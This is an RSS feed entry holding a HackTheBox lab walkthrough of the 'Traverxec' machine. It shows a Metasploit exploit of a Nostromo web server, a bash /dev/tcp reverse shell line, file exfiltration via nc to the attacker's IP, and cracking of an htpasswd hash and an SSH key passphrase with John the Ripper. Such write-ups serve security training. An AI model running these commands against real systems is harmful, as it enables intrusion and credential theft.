<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Metasploit on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/metasploit/</link>
    <description>Recent content in Metasploit on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 06 Aug 2021 16:12:18 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/metasploit/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Traverxec</title>
      <link>https://fahmifj.github.io/hackthebox/traverxec/</link>
      <pubDate>Fri, 06 Aug 2021 16:12:18 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/traverxec/</guid>
      <description>Code execution with path traversal</description>
      <content:encoded><![CDATA[<p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Path Traversal</li>
<li>Sudo exploitation on <code>journalctl</code></li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Metasploit</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nmap -p22,80 -sC -sV  -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165
</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-13 16:11 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.10.165
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.44s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class="o">(</span>RSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class="o">(</span>ECDSA<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class="o">(</span>ED25519<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp open  http    nostromo 1.9.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nostromo 1.9.6
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: TRAVERXEC
</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 12.71 seconds
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---nostromo">TCP 80 - Nostromo</h3>
<p>The hosted site is a personal website of David White.</p>
<p><div class="img-container"><img src="imgs/image-20210714031626971.png" alt="image-20210714031626971"  /></div>
</p>
<p>At the bottom of the page, there is a contact form with 4 input vectors.</p>
<p><div class="img-container"><img src="imgs/image-20210714031846286.png" alt="image-20210714031846286"  /></div>
</p>
<p>I submitted some values  and then started to observe the network traffic, but nothing happen there.</p>
<p><div class="img-container"><img src="imgs/image-20210714032010619.png" alt="image-20210714032010619"  /></div>
</p>
<p>I  ran gobuster, but it also didn&rsquo;t find any interesting.</p>
<h4 id="finding-vulnerabilities">Finding Vulnerabilities</h4>
<p>From previous <code>nmap</code>, nmap identified the <code>nostromo</code> version to be 1.9.6. Feeding that version on <code>searchsploit</code> pops a remote code execution exploit.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ searchsploit nostromo 1.9.6         
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                                               <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">nostromo 1.9.6 - Remote Code Execution                                                       <span class="p">|</span> multiple/remote/47837.py
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">Shellcodes: No Results
</span></span></code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="nostromo-rce-cve-2019-16278-metasploit">Nostromo RCE CVE-2019-16278 (Metasploit)</h4>
<p>Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ msfconsole -q
</span></span><span class="line"><span class="cl">msf6 &gt; search nostromo
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Matching <span class="nv">Modules</span>
</span></span><span class="line"><span class="cl"><span class="o">================</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">   <span class="c1">#  Name                                   Disclosure Date  Rank  Check  Description</span>
</span></span><span class="line"><span class="cl">   -  ----                                   ---------------  ----  -----  -----------
</span></span><span class="line"><span class="cl">   <span class="m">0</span>  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Interact with a module by name or index. For example info 0, use <span class="m">0</span> or use exploit/multi/http/nostromo_code_exec
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">msf6 &gt; use <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using configured payload cmd/unix/reverse_perl
</span></span></code></pre></div><p>Once all the configs are set, I will run the exploits. This results in an interactive shell access as <code>www-data</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msf6 exploit<span class="o">(</span>multi/http/nostromo_code_exec<span class="o">)</span> &gt; run
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.34:53 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable.
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Configuring Automatic <span class="o">(</span>Unix In-Memory<span class="o">)</span> target
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending cmd/unix/reverse_perl <span class="nb">command</span> payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Command shell session <span class="m">1</span> opened <span class="o">(</span>10.10.14.34:53 -&gt; 10.10.10.165:52716<span class="o">)</span> at 2021-07-13 16:31:29 -0400
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">hostname <span class="o">&amp;&amp;</span> ip a
</span></span><span class="line"><span class="cl">traverxec
</span></span><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">    inet 127.0.0.1/8 scope host lo
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span><span class="line"><span class="cl">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UNKNOWN group default qlen <span class="m">1000</span>
</span></span><span class="line"><span class="cl">    link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff
</span></span><span class="line"><span class="cl">    inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0
</span></span><span class="line"><span class="cl">       valid_lft forever preferred_lft forever
</span></span></code></pre></div><h4 id="shell-upgrade">Shell Upgrade</h4>
<p>I will create another interactive shell session so I can upgrade my shell with the PTY trick.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">which bash
</span></span><span class="line"><span class="cl">/usr/bin/bash
</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.34/53 0&gt;&amp;1&#34;</span> <span class="p">&amp;</span>
</span></span></code></pre></div><p>On my new session:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52718</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>421<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ script /dev/null -c bash 
</span></span><span class="line"><span class="cl">script /dev/null -c bash
</span></span><span class="line"><span class="cl">Script started, file is /dev/null
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ ^Z
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> suspended  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ stty raw -echo<span class="p">;</span><span class="nb">fg</span>     
</span></span><span class="line"><span class="cl"><span class="o">[</span>1<span class="o">]</span>  + <span class="m">3835</span> continued  nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">www-data@traverxec:/usr/bin$ stty cols <span class="m">127</span> rows <span class="m">30</span>
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-david">Shell as david</h3>
<h4 id="nostromo-config">Nostromo config</h4>
<p>The <code>nostromo</code> config file under <code>/var/nostromo/conf</code> reveals that there is a <code>.htpasswd</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf 
</span></span><span class="line"><span class="cl"><span class="c1"># MAIN [MANDATORY]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">servername              traverxec.htb
</span></span><span class="line"><span class="cl">serverlisten            *
</span></span><span class="line"><span class="cl">serveradmin             david@traverxec.htb
</span></span><span class="line"><span class="cl">serverroot              /var/nostromo
</span></span><span class="line"><span class="cl">servermimes             conf/mimes
</span></span><span class="line"><span class="cl">docroot                 /var/nostromo/htdocs
</span></span><span class="line"><span class="cl">docindex                index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># LOGS [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">logpid                  logs/nhttpd.pid
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SETUID [RECOMMENDED]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">user                    www-data
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># BASIC AUTHENTICATION [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">htaccess                .htaccess
</span></span><span class="line"><span class="cl">htpasswd                /var/nostromo/conf/.htpasswd
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ALIASES [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/icons                  /var/nostromo/icons
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># HOMEDIRS [OPTIONAL]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">homedirs                /home
</span></span><span class="line"><span class="cl">homedirs_public         public_www
</span></span></code></pre></div><p>This<code>.htpasswd </code> file contains a password hash for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat .htpasswd 
</span></span><span class="line"><span class="cl">david:<span class="nv">$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ</span>/
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd <span class="p">|</span> grep sh <span class="o">&amp;&amp;</span> ls -l /home
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">david:x:1000:1000:david,,,:/home/david:/bin/bash
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 david
</span></span></code></pre></div><h4 id="password-cracking">Password Cracking</h4>
<p><code>JtR</code> can recover the password easily.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./john.exe hashes/traverxec-david.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                                  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1</span>$ <span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">Nowonly4me       <span class="o">(</span>david<span class="o">)</span>
</span></span><span class="line"><span class="cl">1g 0:00:00:43 DONE <span class="o">(</span>2021-07-14 03:44<span class="o">)</span> 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>But turns out it&rsquo;s not a reused password.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ su david
</span></span><span class="line"><span class="cl">Password: 
</span></span><span class="line"><span class="cl">su: Authentication failure
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ 
</span></span></code></pre></div><h4 id="path-traversal---david-home-directory">Path Traversal - David home directory</h4>
<p>The david home directory is not readable by others, but it allows execute permissions. With that, I can determine what files all are available under david&rsquo;s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -l /home/david/
</span></span><span class="line"><span class="cl">ls: cannot open directory <span class="s1">&#39;/home/david/&#39;</span>: Permission denied
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david <span class="m">4096</span> Jul <span class="m">13</span> 06:57 /home/david/
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/.ssh
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root david <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/user.txt
</span></span></code></pre></div><p>Then, when I type <code>public_www</code> (from nostromo config), the tab completion confirms that the folder is there. With <code>r-x</code>, I can use <code>ls -lR</code> command to list all the available contents recursively.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> /home/david/public_www
</span></span><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www
</span></span><span class="line"><span class="cl">/home/david/public_www:
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david  <span class="m">402</span> Oct <span class="m">25</span>  <span class="m">2019</span> index.html
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> david david <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> protected-file-area
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/home/david/public_www/protected-file-area:
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david <span class="m">1915</span> Oct <span class="m">25</span>  <span class="m">2019</span> backup-ssh-identity-files.tgz
</span></span></code></pre></div><p>The <code>backup-ssh-identity-files.tgz</code> seems interesting, I will grab that to my Kali.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz <span class="p">|</span> nc 10.10.14.34 <span class="m">53</span>
</span></span></code></pre></div><p>On my Kali:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span> &gt; loot/backup-ssh-identity-files.tgz
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.165<span class="o">]</span> <span class="m">52728</span>
</span></span></code></pre></div><h4 id="passphrase-crack">Passphrase crack</h4>
<p>The backup file contains a set of SSH keys.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «loot» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ tar -xvf backup-ssh-identity-files.tgz 
</span></span><span class="line"><span class="cl">home/david/.ssh/
</span></span><span class="line"><span class="cl">home/david/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">home/david/.ssh/id_rsa
</span></span><span class="line"><span class="cl">home/david/.ssh/id_rsa.pub
</span></span></code></pre></div><p>But, it is protected with a passphrase.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa david@traverxec.htb 
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;id_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">david@traverxec.htb<span class="err">&#39;</span>s password:
</span></span></code></pre></div><p>So I will convert the key to crackable format hash using <code>ssh2john</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ /usr/share/john/ssh2john.py id_rsa &gt; david_rsa.hash 
</span></span><span class="line"><span class="cl">→ kali@kali «ssh-keys» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ cat david_rsa.hash 
</span></span><span class="line"><span class="cl">id_rsa:<span class="nv">$sshng$1$16$477</span>EEFFBA56F9D283D349033D5D08C4F<span class="nv">$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672</span>...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p><code>JtR</code>  recovers the passphrase to <code>hunter</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist<span class="o">=</span>C:/tools/rockyou.txt                    
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64<span class="o">])</span>
</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES<span class="o">])</span> is <span class="m">0</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Cost <span class="m">2</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1</span> <span class="k">for</span> all loaded hashes
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Note: This format may emit <span class="nb">false</span> positives, so it will keep trying even after
</span></span><span class="line"><span class="cl">finding a possible candidate.
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">hunter           <span class="o">(</span>id_rsa<span class="o">)</span>
</span></span></code></pre></div><h4 id="ssh---david">SSH - david</h4>
<p>The key and the passphrase are work for user david.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class="line"><span class="cl">$ ssh -i ssh-keys/david_rsa david@traverxec.htb
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;ssh-keys/david_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">Linux traverxec 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64</span>
</span></span><span class="line"><span class="cl">Last login: Tue Jul <span class="m">13</span> 06:54:56 <span class="m">2021</span> from 10.10.16.7
</span></span><span class="line"><span class="cl">david@traverxec:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>david<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>
</span></span></code></pre></div><p>User flag is done here</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">60</span>
</span></span><span class="line"><span class="cl">drwx--x--x <span class="m">6</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:57 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root  root   <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> david david <span class="m">18992</span> Jul <span class="m">13</span> 05:43 <span class="m">47163</span>
</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root  root      <span class="m">9</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_history -&gt; /dev/null
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david   <span class="m">220</span> Oct <span class="m">25</span>  <span class="m">2019</span> .bash_logout
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david  <span class="m">3544</span> Jul <span class="m">13</span> 06:57 .bashrc
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> bin
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Jul <span class="m">13</span> 06:56 .local
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> david david   <span class="m">807</span> Oct <span class="m">25</span>  <span class="m">2019</span> .profile
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> public_www
</span></span><span class="line"><span class="cl">drwx------ <span class="m">2</span> david david  <span class="m">4096</span> Oct <span class="m">25</span>  <span class="m">2019</span> .ssh
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root  david    <span class="m">33</span> Oct <span class="m">25</span>  <span class="m">2019</span> user.txt
</span></span><span class="line"><span class="cl">david@traverxec:~$ cat user.txt 
</span></span><span class="line"><span class="cl">7db0...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In david&rsquo;s home directory, there is a folder called <code>bin</code>.  Under this <code>bin</code> folder, there is a bash script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~$ ls -l bin/
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> david david <span class="m">802</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.head
</span></span><span class="line"><span class="cl">-rwx------ <span class="m">1</span> david david <span class="m">363</span> Oct <span class="m">25</span>  <span class="m">2019</span> server-stats.sh
</span></span></code></pre></div><p>When I run the script, I get the following results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">david@traverxec:~/bin$ ./server-stats.sh 
</span></span><span class="line"><span class="cl">                                                                          .----.
</span></span><span class="line"><span class="cl">                                                              .---------. <span class="p">|</span> <span class="o">==</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">   Webserver Statistics and Data                              <span class="p">|</span>.-<span class="s2">&#34;&#34;&#34;&#34;&#34;-.| |----|
</span></span></span><span class="line"><span class="cl"><span class="s2">         Collection Script                                    ||       || | == |
</span></span></span><span class="line"><span class="cl"><span class="s2">          (c) David, 2019                                     ||       || |----|
</span></span></span><span class="line"><span class="cl"><span class="s2">                                                              |&#39;-.....-&#39;| |::::|
